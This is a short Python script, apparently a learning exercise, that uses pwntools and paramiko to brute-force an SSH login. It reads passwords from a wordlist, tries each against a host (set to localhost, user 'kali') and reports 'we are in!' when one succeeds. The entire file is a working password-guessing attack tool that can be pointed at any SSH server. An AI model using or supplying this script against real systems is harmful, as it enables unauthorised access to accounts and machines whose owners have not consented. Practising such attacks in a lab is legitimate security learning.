from pwn import *
import paramiko


#variables needed
host = "127.0.0.1"
username = "kali"
attempts = 0

#open a brute force password txt file as a list (your password list will have to be in the same directory, in my case it is called myBFlist.txt)

with open("myBFlist.txt", "r") as password_list:
  #for each of those password, we want to strip the spaces to clean the passwords
	for password in password_list:
		password = password.strip("\n")
    #try to brute force the login using ssh() in pwn, each bf only allow 1s, and specify it's an authentication failure from paramiko lib if the attempt didn't work
		try:
			print("[{}] attempting password: [{}]!".format(attempts,password))
			response = ssh(host=host, user=username, password=password, timeout=1)
      #check the return response, if response is connected, then print "we are in!", then close the response and break the loop
			if response.connected():
				print("we are in! Password: {}".format(password))
				response.close()
				break
      #if the ssh() attempt didn't succeed, we also want to close the response  
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1

